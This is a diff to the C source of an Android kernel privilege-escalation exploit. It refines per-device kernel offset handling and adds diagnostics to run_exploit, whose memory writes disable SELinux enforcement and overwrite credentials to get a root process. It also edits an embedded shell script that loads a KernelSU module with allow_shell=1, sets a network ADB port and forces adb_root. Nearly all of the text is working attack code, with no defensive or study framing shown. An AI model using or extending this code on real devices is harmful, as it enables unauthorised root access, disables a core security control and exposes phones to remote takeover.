@@ -17,67 +17,11 @@
 
 const struct kernel_offsets *active_offsets = NULL;
 
-/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
-#undef SELINUX_ENFORCING_OFF
-#undef INIT_CRED_OFF
-#undef INIT_TASK_OFF
-#undef INIT_UTS_NS_OFF
-#undef EMPTY_ZERO_PAGE_OFF
-#undef ROOT_TASK_GROUP_OFF
-#undef KPTR_RESTRICT_OFF
-#undef SELINUX_BLOB_SIZES_OFF
-#undef SECURITY_HOOK_HEADS_OFF
-#undef KMALLOC_CACHES_OFF
-#undef ANON_PIPE_BUF_OPS_OFF
-#undef ASHMEM_MISC_FOPS_OFF
-#undef ASHMEM_FOPS_OFF
-#undef ASHMEM_IOCTL_OFF
-#undef ASHMEM_COMPAT_IOCTL_OFF
-#undef ASHMEM_MMAP_OFF
-#undef ASHMEM_OPEN_OFF
-#undef ASHMEM_RELEASE_OFF
-#undef ASHMEM_SHOW_FDINFO_OFF
-#undef CONFIGFS_READ_ITER_OFF
-#undef CONFIGFS_BIN_WRITE_ITER_OFF
-#undef COPY_SPLICE_READ_OFF
-#undef NOOP_LLSEEK_OFF
-#undef CAP_CAPABLE_ACTIVE_OFF
-#undef SLIDE_NFULNL_LOGGER_OFF
-#undef SLIDE_LOGGERS_0_1_OFF
-#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
-#undef SLIDE_SYSCTL_BOOTID_OFF
-
-#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
-#define INIT_CRED_OFF                 active_offsets->off_init_cred
-#define INIT_TASK_OFF                 active_offsets->off_init_task
-#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
-#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
-#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
-#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
-#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
-#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
-#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
-#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
-#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
-#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
-#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
-#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
-#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
-#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
-#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
-#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
-#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
-#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
-#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
-#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
-#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
-#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
-#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
-#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id
-
-/* Override struct field offsets (task_struct, etc.) with per-device values */
-#include "runtime_struct_offsets.h"
+/* Per-device symbol offsets are rebound to the runtime table by
+ * runtime_struct_offsets.h, which common.h pulls in as its last include.
+ * Do not #undef/redefine them here: doing it in this one translation unit was
+ * the bug that made fops.c/util.c/slide.c/root.c keep the fallback device's
+ * addresses at compile time. */
 
 static int select_offsets(void) {
   struct utsname uts;
@@ -421,13 +365,17 @@ static void write_root_script(void) {
     "else\n"
     "  diag '[!] policy repair script was not created'\n"
     "fi\n"
-    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+    /* ksud selection order matters: the standalone binary pushed to
+     * /data/local/tmp/a/ksud is the only copy that can be relocated by the
+     * kallsyms loader here, and APK-internal libksud.so is used only as a
+     * fallback because it is not present on a fresh device. */
+    "KSUD=/data/local/tmp/a/ksud\n"
+    "if [ ! -f \"$KSUD\" ]; then\n"
+    "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+    "fi\n"
     "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
     "KSU_READY=0\n"
-    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-    "  diag '[+] KernelSU already loaded'\n"
-    "  KSU_READY=1\n"
-    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
+    "if [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
     "  diag '[*] ksud:' $KSUD\n"
     "  chmod 755 \"$KSUD\" 2>/dev/null\n"
     "  KVER=$(uname -r | cut -d. -f1-2)\n"
@@ -435,24 +383,61 @@ static void write_root_script(void) {
     "  KMI=\"${AVER}-${KVER}\"\n"
     "  diag '[*] KMI=' $KMI\n"
     "  mkdir -p /data/adb/ksu 2>/dev/null\n"
-    "  diag '[*] ksud late-load --kmi' $KMI\n"
+    "  # Standard insmod cannot load this module: the kernel trims unused\n"
+    "  # ksymtab entries, so 181 symbols (path_umount, filp_open,\n"
+    "  # strncpy_from_user_nofault, commit_creds, ...) are unresolved and\n"
+    "  # insmod exits 2. Verified in an isolated boot of the same Image.bin.\n"
+    "  # ksud resolves them through /proc/kallsyms instead, so it is the only\n"
+    "  # loader that works here.\n"
+    "  KOSRC=/data/local/tmp/a/kernelsu.ko\n"
+    "  if [ -f \"$KOSRC\" ]; then\n"
+    "    cp \"$KOSRC\" /data/adb/ksud.ko 2>/dev/null\n"
+    "    chmod 644 /data/adb/ksud.ko 2>/dev/null\n"
+    "    diag '[*] ksud.ko staged' $(ls -l /data/adb/ksud.ko 2>/dev/null | awk '{print $5}') 'bytes'\n"
+    "  else\n"
+    "    diag '[!] no ko at' $KOSRC\n"
+    "  fi\n"
+    "  # /data/adb/ksud must exist BEFORE `ksud install`, otherwise install\n"
+    "  # only creates /data/adb/ksu/bin/ksud -> /data/adb/ksud, a dangling\n"
+    "  # symlink, and every later resetprop/set-manager call fails.\n"
+    "  if [ -f /data/local/tmp/a/ksud ]; then\n"
+    "    cp /data/local/tmp/a/ksud /data/adb/ksud 2>/dev/null\n"
+    "    chmod 755 /data/adb/ksud 2>/dev/null\n"
+    "    diag '[*] /data/adb/ksud' $(ls -l /data/adb/ksud 2>/dev/null | awk '{print $5}') 'bytes'\n"
+    "  fi\n"
+    "  LIBADBROOT=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libadbroot.so' 2>/dev/null | head -1)\n"
+    "  if [ -n \"$LIBADBROOT\" ]; then\n"
+    "    \"$KSUD\" install --libadbroot \"$LIBADBROOT\" --data-path /data/adb >>$ROOT_LOG 2>&1\n"
+    "  else\n"
+    "    \"$KSUD\" install --data-path /data/adb >>$ROOT_LOG 2>&1\n"
+    "  fi\n"
+    "  diag '[*] ksud install exit='$?\n"
+    "  ls -lR /data/adb >>$ROOT_LOG 2>&1\n"
     "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
     "  rm -f \"$KSUD_LOG\"\n"
-    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
-    "  KSUD_PID=$!\n"
-    "  diag '[*] ksud pid='$KSUD_PID\n"
-    "  KSUD_EXITED=0\n"
-    "  for w in $(seq 1 30); do\n"
-    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
-    "    sleep 1\n"
-    "  done\n"
-    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
-    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
-    "    diag '[*] ksud exit='$KSUD_STATUS\n"
-    "  else\n"
-    "    diag '[!] ksud still running after 30s; capturing process state'\n"
-    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
-    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
+    "  # NEVER call `ksud unload` here. Its kallsyms loader does not complete\n"
+    "  # the sysfs/RCU registration that load_module() performs, so\n"
+    "  # delete_module() runs against an incomplete struct module and panics\n"
+    "  # the kernel (observed: 'Unable to stop service zygote_ocomp' /\n"
+    "  # 'Unable to start service netd', followed by a reboot). The module\n"
+    "  # therefore has to be loaded correctly ONCE, with allow_shell=1.\n"
+    "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "    diag '[*] module already loaded; not unloading (unsafe)'\n"
+    "  fi\n"
+    "  # allow_shell is a bool module parameter (.modinfo: parmtype=allow_shell:bool).\n"
+    "  # Without it the kernel only honours the allowlist and shell (uid 2000)\n"
+    "  # gets EPERM from ksuctl, i.e. no usable su. `ksud late-load --allow-shell`\n"
+    "  # was verified NOT to forward the parameter, so pass it explicitly through\n"
+    "  # `ksud insmod`, which accepts key=val load parameters.\n"
+    "  if [ -f /data/adb/ksud.ko ] && ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "    diag '[*] ksud insmod allow_shell=1 (first load)'\n"
+    "    \"$KSUD\" insmod /data/adb/ksud.ko allow_shell=1 >>\"$KSUD_LOG\" 2>&1\n"
+    "    diag '[*] insmod allow_shell exit='$? 'loaded='$(grep -c kernelsu /proc/modules 2>/dev/null)\n"
+    "    if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "      diag '[!] allow_shell form rejected; retrying bare insmod'\n"
+    "      \"$KSUD\" insmod /data/adb/ksud.ko >>\"$KSUD_LOG\" 2>&1\n"
+    "      diag '[*] insmod bare exit='$? 'loaded='$(grep -c kernelsu /proc/modules 2>/dev/null)\n"
+    "    fi\n"
     "  fi\n"
     "  if [ -s \"$KSUD_LOG\" ]; then\n"
     "    diag '[*] ksud output:'\n"
@@ -464,18 +449,20 @@ static void write_root_script(void) {
     "if [ \"$KSU_READY\" = 1 ]; then\n"
     "  diag '[+] KSU LOADED'\n"
     "  grep kernelsu /proc/modules\n"
-    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-    "  if [ -n \"$RSPROP\" ]; then\n"
-    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
-    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
-    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
-    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
-    "  fi\n"
+    "  # Use the installed binary for kernel-interface calls; it is the same\n"
+    "  # build as the loader above and survives the install symlink rework.\n"
+    "  KSUDBIN=/data/adb/ksud\n"
+    "  if [ ! -x \"$KSUDBIN\" ]; then KSUDBIN=$KSUD; fi\n"
+    "  ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
+    "  \"$KSUDBIN\" resetprop -p persist.adb.tcp.port $ADB_PORT >>$ROOT_LOG 2>&1\n"
+    "  \"$KSUDBIN\" resetprop service.adb.tcp.port $ADB_PORT >>$ROOT_LOG 2>&1\n"
+    "  diag '[*] persist.adb.tcp.port='$(getprop persist.adb.tcp.port 2>/dev/null)\n"
+    "  # The module hardcodes its manager package as me.weishu.kernelsu, so the\n"
+    "  # ReSukiSU package is never recognised as manager. adb_root is still\n"
+    "  # feature-addressable, which is the only setting worth forcing here.\n"
+    "  \"$KSUDBIN\" feature set adb_root 1 >>$ROOT_LOG 2>&1\n"
+    "  diag '[*] adb_root feature='$(\"$KSUDBIN\" feature get adb_root 2>/dev/null | tail -1)\n"
     "  rm -f /data/local/tmp/.ghostlock_w1\n"
-    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
-    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
-    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
-    "  fi\n"
     "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
     "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
     "  report_status ready\n"
@@ -651,6 +638,9 @@ int run_exploit(int argc, char **argv) {
     for (int att = 1; att <= 5 && !selinux_ok; att++) {
       pr_info("Write 1 attempt %d/5\n", att);
       do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
+      pr_info("  route landed=%d (ret=%d expected=%d loops=%d)\n",
+              pselect_route_landed(), route_last_ret, PSELECT_EXPECTED_READY,
+              route_last_loops);
       usleep(100000);
       if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
     }
@@ -711,12 +701,23 @@ int run_exploit(int argc, char **argv) {
       pr_warning("W2: cred preparation failed on round %d\n", round);
       continue;
     }
+    pr_info("  route landed=%d (ret=%d expected=%d loops=%d)\n",
+            pselect_route_landed(), route_last_ret, PSELECT_EXPECTED_READY,
+            route_last_loops);
     usleep(50000);
     write(pipes.cmd_w, "C", 1);
     uint32_t child_uid = 9999;
     read(pipes.uid_r, &child_uid, sizeof(child_uid));
     pr_info("child uid = %u\n", child_uid);
     if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
+    else if (!pselect_route_landed()) {
+      /* ret<=3 means the overlay missed, so this round's write could not have
+       * landed. Say so, because "child uid = 2000" alone looks like a wrong
+       * credential offset when it is really a missed fd_set layout. */
+      pr_warning("  round %d missed the waiter (ret=%d); the write was dropped, "
+                 "retrying is the correct response\n",
+                 round, route_last_ret);
+    }
   }
 
   write(pipes.cmd_w, "G", 1);
@@ -836,6 +837,9 @@ static int run_write1_only(void) {
     slab_drain();
     pr_info("Write 1 attempt %d/20\n", att);
     do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
+    pr_info("  route landed=%d (ret=%d expected=%d loops=%d)\n",
+            pselect_route_landed(), route_last_ret, PSELECT_EXPECTED_READY,
+            route_last_loops);
     usleep(100000);
     if (check_selinux_off()) {
       pr_success("SELinux DISABLED\n");
